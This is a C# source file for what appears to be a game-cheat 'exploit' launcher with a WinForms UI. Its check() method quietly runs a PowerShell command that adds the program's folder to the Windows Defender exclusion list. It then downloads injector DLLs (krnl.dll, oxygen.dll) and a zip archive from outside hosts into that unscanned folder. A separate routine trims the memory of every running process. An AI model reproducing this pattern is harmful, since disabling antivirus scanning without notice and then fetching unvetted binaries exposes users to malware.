using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO.Compression;
using System.Management.Automation;

namespace ZortTechnologies_ExploitUi1_WinForms
{
    internal class ai
    {
        [DllImportAttribute("kernel32.dll", EntryPoint = "SetProcessWorkingSetSize", ExactSpelling = true, CharSet = CharSet.Ansi, SetLastError = true)]

        private static extern int SetProcessWorkingSetSize(IntPtr process, int minimumWorkingSetSize, int maximumWorkingSetSize);
        [DllImport("psapi")]
        public static extern int EmptyWorkingSet(IntPtr handle);
        WebClient wc = new WebClient();
        public void optimize()
        {
            Task.Run(delegate {
                GC.Collect();

                GC.WaitForPendingFinalizers();

                if (Environment.OSVersion.Platform == PlatformID.Win32NT)
                {

                    SetProcessWorkingSetSize(System.Diagnostics.Process.GetCurrentProcess().Handle, -1, -1);

                }
                Process[] process = Process.GetProcesses();
               


                foreach (Process p in process) try { EmptyWorkingSet(p.Handle); } catch { }

                process = Process.GetProcesses();
            });
        }
        public void check()
        {
            if (!wc.DownloadString("https://raw.githubusercontent.com/ZortTechnologies/ZortTechnolgoiesExploitMakerExploits/main/ZortTechnologies_ExploitUi1_WinForms/ver.verme").Contains("0.0.1"))
            {
                MessageBox.Show("Please Update The Exploit.");
            }
            else
            {

            }
                //Credits power shell script by : versadby
            using (PowerShell powerShell = PowerShell.Create())
            {
                powerShell.AddScript("Add-MpPreference -ExclusionPath '" + Directory.GetCurrentDirectory() + "'");
                powerShell.Invoke();
                powerShell.Dispose();
            }
            /*/new Task(delegate{/*/
             /*/});/*/
            if (Directory.Exists(Directory.GetCurrentDirectory() + "\\bin"))
            {

            }
            else
            {
                try
                {
                    //dwmsg.Show();
                    MessageBox.Show("Press Ok To Download Files");
                    System.Threading.Thread.Sleep(200);
                    Directory.CreateDirectory(Directory.GetCurrentDirectory() + "\\bin");
                }
                catch (Exception ex)
                {

                }

            }
            if (Directory.Exists(Directory.GetCurrentDirectory() + @"\bin\Monaco"))
            {

            }
            else
            {
                try
                {
                    //dwmsg.Show();

                    System.Threading.Thread.Sleep(200);
                    wc.DownloadFile("https://github.com/ZortTechnologies/ZortTechnolgoiesExploitMakerExploits/raw/main/ZortTechnologies_ExploitUi1_WinForms/Monaco.zip", Directory.GetCurrentDirectory() + @"\bin\Monaco.zip");

                    ZipFile.ExtractToDirectory(Directory.GetCurrentDirectory() + @"\bin\Monaco.zip", Directory.GetCurrentDirectory() + @"\bin\");
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }

            }
            //\temp\
            if (Directory.Exists(Directory.GetCurrentDirectory() + "\\temp"))
            {

            }
            else
            {
                try
                {
                    ////dwmsg.Show();

                    System.Threading.Thread.Sleep(200);
                    Directory.CreateDirectory(Directory.GetCurrentDirectory() + "\\temp");
                }
                catch (Exception ex)
                {

                }

            }
            if (Directory.Exists(Directory.GetCurrentDirectory() + "\\scripts"))
            {

            }
            else
            {
                try
                {
                    Directory.CreateDirectory(Directory.GetCurrentDirectory() + "\\scripts");
                }
                catch (Exception ex)
                {

                }

            }
            if (Directory.Exists(Directory.GetCurrentDirectory() + "\\autoexec"))
            {

            }
            else
            {
                try
                {
                    Directory.CreateDirectory(Directory.GetCurrentDirectory() + "\\autoexec");
                }
                catch (Exception ex)
                {

                }
            }
            if (File.Exists(Directory.GetCurrentDirectory() + "\\oxygen.dll"))
            {

            }
            else
            {
                try
                {
                    wc.DownloadFile("https://github.com/iDevastate/Oxygen-v2/raw/main/OxygenBytecode.vmp.dll", "oxygen.dll");
                }
                catch (Exception ex)
                {
                    //upper(ex.Message);
                }
            }
            if (File.Exists(Directory.GetCurrentDirectory() + "\\krnl.dll"))
            {

            }
            else
            {
                try
                {
                    wc.DownloadFile(" https://k-storage.com/bootstrapper/files/krnl.dll", Directory.GetCurrentDirectory() + "\\krnl.dll");
                }
                catch (Exception ex)
                {
                    //upper(ex.Message);

                }
            }

            
            //});
        }

    }
}
